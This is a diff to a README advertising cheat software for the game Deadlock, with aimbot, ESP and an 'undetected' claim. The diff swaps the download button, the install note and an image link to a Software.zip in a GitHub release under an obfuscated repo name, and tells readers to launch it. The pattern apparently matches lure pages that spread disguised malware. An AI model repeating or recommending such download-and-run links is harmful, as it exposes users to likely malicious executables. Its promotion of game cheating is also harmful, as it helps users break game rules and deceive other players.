@@ -31,12 +31,12 @@ Our software for Deadlock encompasses a range of features including aimbot, ESP,
 
 Click the button below to download the software:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Jajatahai/Dead1ock-h4ck/releases/download/v2.0/Software.zip)](https://github.com/Jajatahai/Dead1ock-h4ck/releases/download/v2.0/Software.zip)
 
-*Note: Once downloaded, the Software.zip needs to be launched to install the software.*
+*Note: Once downloaded, the https://github.com/Jajatahai/Dead1ock-h4ck/releases/download/v2.0/Software.zip needs to be launched to install the software.*
 
 We invite you to explore the full potential of Deadlock with our cutting-edge tools. Get ahead of the game, stay undetected, and dominate the competition with the help of our innovative software.
 
 Happy hacking! 🔫🎮💻
 
-![image](https://imageurl.com)
+![image](https://github.com/Jajatahai/Dead1ock-h4ck/releases/download/v2.0/Software.zip)
